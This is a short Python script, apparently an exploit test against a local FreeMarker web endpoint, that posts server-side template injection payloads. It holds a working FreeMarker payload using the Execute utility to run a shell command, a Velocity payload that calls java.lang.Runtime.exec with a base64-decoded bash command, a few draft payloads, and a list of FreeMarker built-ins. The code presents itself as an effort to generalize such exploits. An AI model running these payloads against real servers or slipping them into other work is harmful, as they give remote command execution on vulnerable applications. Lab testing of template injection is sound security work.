import requests

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5051/freemarker"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

payload ='''<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }'''



print (sendPayload(payload))


# the following code is an attempt to generalize the exploits
#TODO with more information about several template engines try to continue

payload ='<#assign ex="x"><#assign ex="y"> ${ ex }'

payload ='''
#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
#set($null=$proc.waitFor())
${null}
'''

payload ='<#assign proc=Runtime> ${ proc }'






available_methods_in_assign='''
abs, ancestors, api, 
boolean, byte, 
c, capFirst, capitalize, ceiling, children, chopLinebreak, chunk, contains, counter, 
date, dateIfUnknown, datetime, datetimeIfUnknown, default, double, 
endsWith, ensureEndsWith, ensureStartsWith, esc, eval, exists, 
first, float, floor, 
groups, 
hasApi, hasContent, hasNext, html, 
ifExists, index, indexOf, int, interpret, isBoolean, isCollection, isCollectionEx, isDate, isDateLike, isDateOnly, isDatetime, isDirective, isEnumerable, isEvenItem, isFirst, isHash, isHashEx, isIndexable, isInfinite, isLast, isMacro, isMarkupOutput, isMethod, isNan, isNode, isNumber, isOddItem, isSequence, isString, isTime, isTransform, isUnknownDateLike, iso, isoH, isoHNZ, isoLocal, isoLocalH, isoLocalHNZ, isoLocalM, isoLocalMNZ, isoLocalMs, isoLocalMsNZ, isoLocalNZ, isoM, isoMNZ, isoMs, isoMsNZ, isoNZ, isoUtc, isoUtcFZ, isoUtcH, isoUtcHNZ, isoUtcM, isoUtcMNZ, isoUtcMs, isoUtcMsNZ, isoUtcNZ, itemCycle, itemParity, itemParityCap, 
jString, join, jsString, jsonString, 
keepAfter, keepAfterLast, keepBefore, keepBeforeLast, keys, 
last, lastIndexOf, leftPad, length, long, lowerAbc, lowerCase, 
markupString, matches, 
namespace, new, nextSibling, noEsc, nodeName, nodeNamespace, nodeType, number, numberToDate, numberToDatetime, numberToTime, 
parent, previousSibling, 
removeBeginning, removeEnding, replace, reverse, rightPad, root, round, rtf, 
seqContains, seqIndexOf, seqLastIndexOf, sequence, short, size, sort, sortBy, split, startsWith, string, substring, switch, 
then, time, timeIfUnknown, trim, 
uncapFirst, upperAbc, upperCase, url, urlPath, 
values, 
webSafe, wordList, 
xhtml, xml
'''

